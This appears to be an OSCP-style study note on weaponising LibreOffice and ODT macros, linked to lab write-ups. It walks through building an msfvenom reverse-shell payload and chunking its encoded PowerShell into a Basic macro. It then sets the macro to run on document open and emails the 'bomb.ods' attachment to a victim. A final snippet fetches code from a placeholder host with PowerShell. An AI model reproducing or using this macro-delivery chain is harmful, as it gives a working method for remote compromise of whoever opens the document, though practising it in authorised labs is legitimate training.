# Macros

- ODT, OpenOffice, Macro ->
  - [https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004](https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004)
  - [https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004--------------------------------](https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004--------------------------------)

# LibreOffice
- This likely means that it will accept .ods or .xls files, which might be a good opportunity for a macro attack.

## LibreOffice Macro
First, let's create a hta file that will contain our payload.
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f hta-psh -o evil.hta
```
Inside this file, we can find the following command.
```
"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBT....QAcwApADsA"
```
VBA has a 255-character limit for literal strings, but this restriction does not apply to strings stored in variables. Our goal is to transform this giant string in smaller chunks, like this.
```
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
...
Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
Str = Str + "AdABhAHIAdAAoACQAcwApADsA"
```
We can accomplish this using a simple script, such as this.
```
s = "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```
```
python3 transform.py
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
...
Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
Str = Str + "AdABhAHIAdAAoACQAcwApADsA"
```
We can now create our LibreOffice macro. Create a new `.ods` file in LibreOffice Calc, then create a macro in that file. The macro will look like this.
```
Sub Exploit

   Dim Str As String

   Str = Str + "cmd.exe /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
   Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
   Str = Str + "AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc"
   Str = Str + "wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA"
   Str = Str + "uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A"
   ...
   Str = Str + "EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ"
   Str = Str + "AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ"
   Str = Str + "QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB"
   Str = Str + "zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA"
   Str = Str + "HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ"
   Str = Str + "AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc"
   Str = Str + "wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB"
   Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
   Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
   Str = Str + "AdABhAHIAdAAoACQAcwApADsA"

   Shell(Str)

End Sub
```
We then need to make this macro run automatically when the document is opened. We can accomplish this by going to the `Tools` -> `Customize` menu, then going to the `Events` tab. There, assign the macro to the `Open Document` event.
![image](https://github.com/m3t3kh4n/OSCP/assets/112255413/5fc72c71-d618-4b7c-9746-4fff02d6fef6)
While there are many options for this, we will use a simple command line tool.
```
sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.120.132:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a bomb.ods
```
In this command, we send an email to mailadmin@localhost containing our bomb.ods attachment. After sending that email, all that remains is to wait (it can take up to five minutes).

# ODT File - VBS file
```
Sub Main
  Shell("cmd /c powershell iwr <ip>")
End Sub
```

